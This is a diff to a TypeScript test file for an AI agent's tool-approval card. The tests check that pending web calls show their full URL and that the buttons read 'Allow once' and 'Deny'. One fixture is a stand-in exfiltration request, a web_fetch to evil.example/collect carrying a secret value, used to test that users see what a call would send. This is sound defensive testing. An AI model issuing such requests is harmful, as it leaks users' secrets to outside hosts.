@@ -97,7 +97,7 @@ describe("web status rows", () => {
 describe("what a web call sends", () => {
   const waiting = (tool: string, input: object): Tool => ({
     ...web(tool, input),
-    approval: { approval_id: "a", reason: "web calls need your approval", decision: null, by: null },
+    approval: { approval_id: "a", reason: "web calls need your approval", turn_allow: true, decision: null, by: null },
   });
   const card = (item: Tool) => renderToStaticMarkup(<ToolCard sessionId="s" item={item} />);
 
@@ -105,15 +105,15 @@ describe("what a web call sends", () => {
     const html = card(waiting("web_fetch", { url: "https://evil.example/collect?d=SECRETDATA123" }));
     expect(html).toContain("Wants to read evil.example");
     expect(html).toContain("https://evil.example/collect?d=SECRETDATA123");
-    expect(html).toContain(">Allow</button>");
+    expect(html).toContain(">Allow once</button>");
   });
 
   test("a chat the viewer cannot drive here offers Deny only", () => {
     const item = waiting("web_fetch", { url: "https://a.example/" });
     const html = renderToStaticMarkup(<ToolCard sessionId="s" item={item} blocked />);
     expect(html).toContain(">Deny</button>");
-    expect(html).not.toContain(">Allow</button>");
-    expect(html).not.toContain("for this session");
+    expect(html).not.toContain(">Allow once</button>");
+    expect(html).not.toContain("for this turn");
   });
 
   test("a search waiting for approval shows the whole query, hidden characters as codes", () => {
